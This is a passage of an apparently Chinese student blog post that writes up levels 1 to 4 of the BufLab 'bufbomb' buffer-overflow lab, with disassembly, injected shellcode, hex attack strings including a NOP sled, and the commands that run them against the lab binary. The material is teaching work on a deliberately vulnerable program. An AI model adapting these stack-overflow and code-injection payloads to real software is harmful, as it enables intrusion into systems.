&lt;fizz+0x4f&gt;</span><br><span class="line"> 8048de6:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048dea:	c7 44 24 04 d4 a4 04 	movl   $0x804a4d4,0x4(%esp)</span><br><span class="line"> 8048df1:	08 </span><br><span class="line"> 8048df2:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048df9:	e8 92 fb ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048dfe:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</span><br><span class="line"> 8048e05:	e8 c6 fa ff ff       	call   80488d0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个fizz函数的首地址为<code>08048daf</code>，可以通过仿照level 0的方法来实现，但是这里除了要将返回地址改为<code>08048daf</code>，还需要像参数区压入一个cookie值<code>0x7fb8d860</code></p>
+<p>可以得到这样的栈帧:</p>
+<p><img src="/../images/bufferbomb/image-20240515213756545.png" alt="image-20240515213756545"></p>
+<p>同样由于在这里Gets函数所能存储的输入buf的区域只有0x28个字节，那么就需要输入的字节大小就为:<br>$$<br>buf(0x28)+ebp(0x4)+return area(0x4)&#x3D;48<br>$$<br>然后需要像fizz函数的返回地址中填入值再达到fizz的参数区，向其中填入Cookie值</p>
+<p>那么这个txt文件就应该为:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 af 8d 04 08 </span><br><span class="line">00 00 00 00 60 d8 b8 7f</span><br></pre></td></tr></table></figure>
+
+<p>输入<code>cat level1.txt |./hex2raw |./bufbomb -u 202226010418</code></p>
+<p>运行成功:</p>
+<p><img src="/../images/bufferbomb/image-20240515214042198.png" alt="image-20240515214042198"></p>
+<h3 id="6、level-2"><a href="#6、level-2" class="headerlink" title="6、level 2"></a>6、level 2</h3><p><strong>级别2、Bang（firecracker）</strong>：构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行bang函数；并且要篡改全局变量global_value为cookie值，使其判断成功。因此，需要在缓冲区中注入恶意代码篡改全局变量。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">08048d52 &lt;bang&gt;:</span><br><span class="line"> 8048d52:	55                   	push   %ebp</span><br><span class="line"> 8048d53:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d55:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048d58:	a1 0c d1 04 08       	mov    0x804d10c,%eax</span><br><span class="line"> 8048d5d:	3b 05 04 d1 04 08    	cmp    0x804d104,%eax</span><br><span class="line"> 8048d63:	75 26                	jne    8048d8b &lt;bang+0x39&gt;</span><br><span class="line"> 8048d65:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048d69:	c7 44 24 04 ac a4 04 	movl   $0x804a4ac,0x4(%esp)</span><br><span class="line"> 8048d70:	08 </span><br><span class="line"> 8048d71:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048d78:	e8 13 fc ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048d7d:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)</span><br><span class="line"> 8048d84:	e8 f7 04 00 00       	call   8049280 &lt;validate&gt;</span><br><span class="line"> 8048d89:	eb 18                	jmp    8048da3 &lt;bang+0x51&gt;</span><br><span class="line"> 8048d8b:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048d8f:	c7 44 24 04 c2 a2 04 	movl   $0x804a2c2,0x4(%esp)</span><br><span class="line"> 8048d96:	08 </span><br><span class="line"> 8048d97:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048d9e:	e8 ed fb ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048da3:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</span><br><span class="line"> 8048daa:	e8 21 fb ff ff       	call   80488d0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>需要先找到全局变量global_value,通过查阅bang汇编代码，可以发现有两个地址:</p>
+<p><code>0x804d10c</code>和<code> 0x804d104</code>，通过gdb查看哪一个地址对应了cookie值，哪一个对应了value值:</p>
+<p><img src="/../images/bufferbomb/image-20240515215147724.png" alt="image-20240515215147724"></p>
+<p>那么<code>0x804d10c</code>就对应了value值 </p>
+<p>   <code> 0x804d104</code>就对应了cookie值</p>
+<p>可以尝试编写一段汇编代码，来达到修改cookie的值:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x7fb8d860,0x804d10c //把cookie值赋给value</span><br><span class="line">push $0x8048d52 //把bang返回地址压栈</span><br><span class="line">ret </span><br></pre></td></tr></table></figure>
+
+<p>将这段汇编代码转化为二进制代码:</p>
+<p><img src="/../images/bufferbomb/image-20240515222402877.png" alt="image-20240515222402877"></p>
+<p>最后需要将这段机器码放入buf区中，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8049265:    83 ec 38                    sub    $0x38,%esp // 在栈上分配38h (56) 字节的空间</span><br><span class="line">8049268:    8d 45 d8                    lea    -0x28(%ebp),%eax // 加载ebp - 28h的地址到eax，这是输入buffer的地址</span><br><span class="line">804926b:    89 04 24                    mov    %eax,(%esp) // 把输入buffer的地址压入栈顶，作为参数给Gets函数</span><br><span class="line">804926e:    e8 bf f9 ff ff              call   8048c32 &lt;Gets&gt; // 调用Gets函数，读取输入到buffer</span><br></pre></td></tr></table></figure>
+
+<p>buf的首地址为:ebp-28，用gdb查看ebp-28也就是eax对应的地址:</p>
+<p><img src="/../images/bufferbomb/image-20240515221234957.png" alt="image-20240515221234957"></p>
+<p>那么对应的txt文本就如下:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c7 05 0c d1 04 08 60 	</span><br><span class="line">d8 b8 7f </span><br><span class="line">68 52 8d 04 08       </span><br><span class="line">c3                   	      </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">08 2f 68 55</span><br></pre></td></tr></table></figure>
+
+<p>运行<code>cat level2_handler.txt |./hex2raw |./bufbomb -u 202226010418</code>后如下:</p>
+<p><img src="/../images/bufferbomb/image-20240515222549094.png" alt="image-20240515222549094"></p>
+<p>运行成功</p>
+<h3 id="7、level-3"><a href="#7、level-3" class="headerlink" title="7、level 3"></a>7、level 3</h3><p><strong>级别3、Boom（dynamite）：</strong>前面的攻击都是使目标程序跳转到特定函数，进而利用exit函数结束目标程序运行。Boom要求攻击程序能够返回到原调用函数test继续执行，即要求攻击之后，还原对栈帧结构的破坏。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8048e43:	e8 d0 fd ff ff       	call   8048c18 &lt;uniqueval&gt;</span><br><span class="line">8048e48:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line">8048e4b:	e8 12 04 00 00       	call   8049262 &lt;getbuf&gt;</span><br><span class="line">8048e50:	89 c3                	mov    %eax,%ebx</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里同level2，但是由于要继续运行，因此需要将<code>call 8049262 &lt;getbuf&gt;</code>的下一行地址压栈,那么就能得到如下攻击程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x7fb8d860,%eax //把cookie值存入返回值eax</span><br><span class="line">push $0x8048e50 //把call的下一行地址压栈</span><br><span class="line">ret </span><br></pre></td></tr></table></figure>
+
+<p>将其转换为机器码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b8 60 d8 b8 7f      </span><br><span class="line">68 50 8e 04 08       	</span><br><span class="line">c3                  	</span><br></pre></td></tr></table></figure>
+
+<p>接下来需要将旧的ebp值恢复,利用gdb调试getbuf，然后查看ebp的值:</p>
+<p><img src="/../images/bufferbomb/image-20240515224821753.png" alt="image-20240515224821753"></p>
+<p>那么就能得到最后的攻击程序文本</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b8 60 d8 b8 7f      </span><br><span class="line">68 50 8e 04 08       	</span><br><span class="line">c3                               	      </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00	</span><br><span class="line">60 2f 68 55  //覆盖为old ebp的值</span><br><span class="line">08 2f 68 55	 //返回地址指向call getbuf()的下一跳地址</span><br></pre></td></tr></table></figure>
+
+<p>运行<code>cat level3_handler.txt |./hex2raw |./bufbomb -u 202226010418</code>后如下:</p>
+<p><img src="/../images/bufferbomb/image-20240515230406545.png" alt="image-20240515230406545"></p>
+<p>运行成功</p>
+<h3 id="8、level-4"><a href="#8、level-4" class="headerlink" title="8、level 4"></a>8、level 4</h3><p><strong>级别4、kaboom(Nitro)：</strong>本攻击需要对目标程序连续攻击n&#x3D;5次，但每次攻击，被攻击函数的栈帧内存地址都不同，也就是函数的栈帧位置每次运行时都不一样。因此，要想办法保证每次都能够正确复原原栈帧被破坏的状态，使程序每次都能够正确返回。同时将cookie作为返回值返回给testn。</p>
+<p>getbufn函数汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">8049244:	55                      push   %ebp               // 保存基址指针寄存器的值</span><br><span class="line">8049245:	89 e5                   mov    %esp,%ebp          // 把栈指针寄存器的值复制给基址指针寄存器</span><br><span class="line">8049247:	81 ec 18 02 00 00       sub    $0x218,%esp        // 从栈指针寄存器的值中减去0x218，为局部变量分配内存</span><br><span class="line">804924d:	8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax  // 把ebp-0x208的地址加载到eax里，这将作为Gets函数的参数</span><br><span class="line">8049253:	89 04 24                mov    %eax,(%esp)        // 把eax的值存入栈顶，这将作为Gets函数的参数</span><br><span class="line">8049256:	e8 d7 f9 ff ff          call   8048c32 &lt;Gets&gt;     // 调用Gets函数，它将读取输入并填充到函数栈帧的指定位置</span><br><span class="line">804925b:	b8 01 00 00 00          mov    $0x1,%eax          // 把1加载到eax中，这将作为函数的返回值</span><br><span class="line">8049260:	c9                      leave                     // 把ebp的值赋给esp，然后弹出ebp，清空函数栈帧</span><br><span class="line">8049261:	c3                      ret                       // 返回到调用者</span><br></pre></td></tr></table></figure>
+
+<p>可以看到getbufn将栈区扩大到了0x218,并且Gets函数输入的buf也扩大到了0x208</p>
+<p>testn函数汇编:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">08048cce &lt;testn&gt;:</span><br><span class="line"> 8048cce:	55                   	push   %ebp</span><br><span class="line"> 8048ccf:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048cd1:	53                   	push   %ebx</span><br><span class="line"> 8048cd2:	83 ec 24             	sub    $0x24,%esp</span><br><span class="line"> 8048cd5:	e8 3e ff ff ff       	call   8048c18 &lt;uniqueval&gt;</span><br><span class="line"> 8048cda:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048cdd:	e8 62 05 00 00       	call   8049244 &lt;getbufn&gt;</span><br><span class="line"> 8048ce2:	89 c3                	mov    %eax,%ebx</span><br><span class="line"> 8048ce4:	e8 2f ff ff ff       	call   8048c18 &lt;uniqueval&gt;</span><br><span class="line"> 8048ce9:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048cec:	39 d0                	cmp    %edx,%eax</span><br><span class="line"> 8048cee:	74 16                	je     8048d06 &lt;testn+0x38&gt;</span><br><span class="line"> 8048cf0:	c7 44 24 04 60 a4 04 	movl   $0x804a460,0x4(%esp)</span><br><span class="line"> 8048cf7:	08 </span><br><span class="line"> 8048cf8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048cff:	e8 8c fc ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048d04:	eb 46                	jmp    8048d4c &lt;testn+0x7e&gt;</span><br><span class="line"> 8048d06:	3b 1d 04 d1 04 08    	cmp    0x804d104,%ebx</span><br><span class="line"> 8048d0c:	75 26                	jne    8048d34 &lt;testn+0x66&gt;</span><br><span class="line"> 8048d0e:	89 5c 24 08          	mov    %ebx,0x8(%esp)</span><br><span class="line"> 8048d12:	c7 44 24 04 8c a4 04 	movl   $0x804a48c,0x4(%esp)</span><br><span class="line"> 8048d19:	08 </span><br><span class="line"> 8048d1a:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048d21:	e8 6a fc ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048d26:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)</span><br><span class="line"> 8048d2d:	e8 4e 05 00 00       	call   8049280 &lt;validate&gt;</span><br><span class="line"> 8048d32:	eb 18                	jmp    8048d4c &lt;testn+0x7e&gt;</span><br><span class="line"> 8048d34:	89 5c 24 08          	mov    %ebx,0x8(%esp)</span><br><span class="line"> 8048d38:	c7 44 24 04 a6 a2 04 	movl   $0x804a2a6,0x4(%esp)</span><br><span class="line"> 8048d3f:	08 </span><br><span class="line"> 8048d40:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</span><br><span class="line"> 8048d47:	e8 44 fc ff ff       	call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048d4c:	83 c4 24             	add    $0x24,%esp</span><br><span class="line"> 8048d4f:	5b                   	pop    %ebx</span><br><span class="line"> 8048d50:	5d                   	pop    %ebp</span><br><span class="line"> 8048d51:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+
+<p>getbufn的栈帧结构如下:</p>
+<img src="../images/bufferbomb/image-20240516220211069.png" alt="image-20240516220211069" style="zoom:67%;">
+
+<p>那么buf区就要填满<br>$$<br>0x208 + 4(返回地址)+4(填入参数)&#x3D;528个字节<br>$$<br>而对于testn函数，由于其栈帧每次都不同，那么ebp的位置也不同，但是根据下面的汇编代码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">8048cce:	55                   	push   %ebp</span><br><span class="line">8048ccf:	89 e5                	mov    %esp,%ebp</span><br><span class="line">8048cd1:	53                   	push   %ebx</span><br><span class="line">8048cd2:	83 ec 24             	sub    $0x24,%esp</span><br><span class="line">8048cd5:	e8 3e ff ff ff       	call   8048c18 &lt;uniqueval&gt;</span><br><span class="line">8048cda:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line">8048cdd:	e8 62 05 00 00       	call   8049244 &lt;getbufn&gt;</span><br><span class="line">8048ce2:	89 c3                	mov    %eax,%ebx</span><br></pre></td></tr></table></figure>
+
+<p>其开辟的栈帧结构如图:<br><img src="/../images/bufferbomb/image-20240516221552530.png" alt="image-20240516221552530"></p>
+<p>那么就可以得到:<code>ebp=esp+4+0x24=esp+0x28</code></p>
+<p>当getbufn函数返回后，需要返回到testn中调用getbufn函数的下一条指令地址:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8048cdd:	e8 62 05 00 00       	call   8049244 &lt;getbufn&gt;</span><br><span class="line">8048ce2:	89 c3                	mov    %eax,%ebx</span><br></pre></td></tr></table></figure>
+
+<p>也就是把<code>0x8048ce2</code>压栈，并且将cookie赋给eax，就得到了如下的攻击程序:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x7fb8d860,%eax   //将cookie赋给eax</span><br><span class="line">lea 0x28(%esp),%ebp		 //ebp的值为esp+0x28</span><br><span class="line">push $0x8048ce2				 //压栈</span><br><span class="line">ret </span><br></pre></td></tr></table></figure>
+
+<p>将其转换为机器码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 60 d8 b8 7f       	mov    $0x7fb8d860,%eax</span><br><span class="line">   5:	8d 6c 24 28          	lea    0x28(%esp),%ebp</span><br><span class="line">   9:	68 e2 8c 04 08       	push   $0x8048ce2</span><br><span class="line">   e:	c3                   	ret</span><br></pre></td></tr></table></figure>
+
+<p>就得到了攻击程序的文本:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 60 d8 b8 7f       	</span><br><span class="line">8d 6c 24 28          	</span><br><span class="line">68 e2 8c 04 08       </span><br><span class="line">c3       </span><br></pre></td></tr></table></figure>
+
+<p>由于程序是随机的，不知道何时执行程序，那么就需要nop来进行滑动的操作，等待进行getbufn的操作，因此buf区填充的值应该为nop的操作码也就是<code>0x90</code></p>
+<p>同时需要知道第一个执行的buf首地址，那么就进行gdb调试:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">804924d:	8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax  // 把ebp-0x208的地址加载到eax里，这将作为Gets函数的参数</span><br><span class="line">8049253:	89 04 24                mov    %eax,(%esp)        // 把eax的值存入栈顶，这将作为Gets函数的参数</span><br><span class="line">8049256:	e8 d7 f9 ff ff          call   8048c32 &lt;Gets&gt;     // 调用Gets函数，它将读取输入并填充到函数栈帧的指定位置</span><br><span class="line">804925b:	b8 01 00 00 00          mov    $0x1,%eax    </span><br></pre></td></tr></table></figure>
+
+<p>eax中存放了buf的首地址，使用<code>b *8049253</code>来设置断点，然后来查看eax寄存器中的值:</p>
+<p><img src="/../images/bufferbomb/image-20240516224349905.png" alt="image-20240516224349905"></p>
+<p>分别是:</p>
+<blockquote>
+<p>0x55682d28</p>
+<p>0x55682d78</p>
+<p>0x55682d68</p>
+<p>0x55682d38</p>
+<p>0x55682d48</p>
+</blockquote>
+<p>取最高的地址<code>0x55682d78</code>作为返回地址,这样子就能通过nop指令来不断向下滑动来执行攻击代码。</p>
+<p>攻击代码占用15个字节，最后需要填充4个字节的地址，那么就需要在前面填充<code>528-15-4=509</code>个字节的0x90</p>
+<p>最终得到了如下的文本:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">...</span><br><span class="line">//500</span><br><span class="line">90 90 90 90 90 90 90 90 90 </span><br><span class="line">b8 60 d8 b8 7f       	</span><br><span class="line">8d 6c 24 28          	</span><br><span class="line">68 e2 8c 04 08       </span><br><span class="line">c3     </span><br><span class="line">78 2d 68 55</span><br></pre></td></tr></table></figure>
+
+<p>然后通过运行<code>cat level4_handler.txt |./hex2raw -n|./bufbomb -n -u 202226010418</code>来验证</p>
+<p><img src="/../images/bufferbomb/image-20240516231607866.png" alt="image-20240516231607866"></p>
+<h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><ol>
+<li><p><strong>深入理解缓冲区溢出</strong>：通过亲手实践，我对缓冲区溢出攻击的具体细节和背后的原理有了更加深入的理解。这种攻击不仅仅是理论上的概念，而是可以具体执行和观察的。</p>
+</li>
+<li><p><strong>安全意识的提升</strong>：完成这个实验强化了我在编码时需要持续保持高度警觉的重要性。现在我更加意识到，在设计和实现软件系统时，考虑安全性是非常关键的。</p>
+</li>
+<li><p><strong>工具和技术的掌握</strong>：通过这个实验，我学会了使用一些重要的工具和技术，比如gdb调试器，以及一些用于分析程序执行和内存布局的技巧。这些技能不仅对于安全研究来说是宝贵的，对于一般的软件开发和维护也同样重要。</p>
+</li>
+<li><p><strong>攻防平衡的认识</strong>：学习如何执行缓冲区溢出攻击让我深刻认识到，不仅要学会如何保护系统不受攻击，还需理解攻击者的思维。这样的双向认识有助于更好地设计防御策略。</p>
+</li>
+<li><p><strong>细节的重要性</strong>：实验教会了我对编程中的细节要给予足够的重视。一行代码中的一个小错误或遗漏都可能导致安全漏洞。</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://ycx6666.github.io/2024/06/bufferbomb/" data-id="clwbswv4n0008pcmcheax3e12" data-title="BufLab实验" class="article-share-link">分享</a>
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%9E%E9%AA%8C/" rel="tag">实验</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" class="wow fadeInUp">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/39835d2c0c77fc39bbdbf18327eb980dc512e672.jpg@1256w_708h_!web-article-pic.webp" data-sizes="auto" alt="" class="lazyload">
+        
+      
+      <a href="/2024/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          (no title)
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+        </div>
+        <footer id="footer" class="wow fadeInUp">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+        [object Object]
+      
+      <div>
+        <span class="icon-copyright"></span>
+        2020-2024
+        <span class="footer-info-sep"></span>
+        Ycx.Cc
+      </div>
+      
+        <div>
+          基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+          Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+        </div>
+      
+      
+        <div>
+          <span class="icon-brush"></span>
+          63.7k
+          &nbsp;|&nbsp;
+          <span class="icon-coffee"></span>
+          04:18
+        </div>
+      
+      
+        <div>
+          <span class="icon-eye"></span>
+          <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+          &nbsp;|&nbsp;
+          <span class="icon-user"></span>
+          <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+        </div>
+      
+    </div>
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">一、实验目的：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E6%8A%80%E8%83%BD%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">二、实验技能：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">三、实验要求：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="toc-number">4.</span> <span class="toc-text">四、实验内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%9F%BA%E4%BA%8E%E5%AD%A6%E5%8F%B7%E7%94%9F%E6%88%90cookie"><span class="toc-number">4.1.</span> <span class="toc-text">1、基于学号生成cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%88%86%E6%9E%90getbuf%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.</span> <span class="toc-text">2、分析getbuf函数:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%88%86%E6%9E%90getbufn%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">4.3.</span> <span class="toc-text">3、分析getbufn函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81Level-0"><span class="toc-number">4.4.</span> <span class="toc-text">4、Level 0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81level-1"><span class="toc-number">4.5.</span> <span class="toc-text">5、level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81level-2"><span class="toc-number">4.6.</span> <span class="toc-text">6、level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81level-3"><span class="toc-number">4.7.</span> <span class="toc-text">7、level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E3%80%81level-4"><span class="toc-number">4.8.</span> <span class="toc-text">8、level 4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">五、实验总结</span></a></li></ol></div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="Ycx.Cc" class="lazyload">
+  <div class="sidebar-author-name">Ycx.Cc</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">28</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">17</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
